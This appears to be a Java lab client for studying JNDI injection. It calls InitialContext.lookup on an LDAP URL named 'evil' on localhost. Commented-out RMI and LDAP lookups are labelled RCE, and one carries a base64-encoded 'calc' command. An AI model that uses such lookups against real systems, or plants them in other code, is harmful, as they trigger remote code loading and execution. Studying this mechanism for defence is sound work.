package JNDI;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import org.apache.naming.factory.BeanFactory;

public class client {
    public static void main(String[] args) throws Exception {
        InitialContext context = new InitialContext();

        // context.lookup("rmi://127.0.0.1:7778/RCE");
        context.lookup("ldap://127.0.0.1:1234/evil");
        // context.lookup("ldap://127.0.0.1:1389/Basic/Command/Y2FsYw==");

    }
}
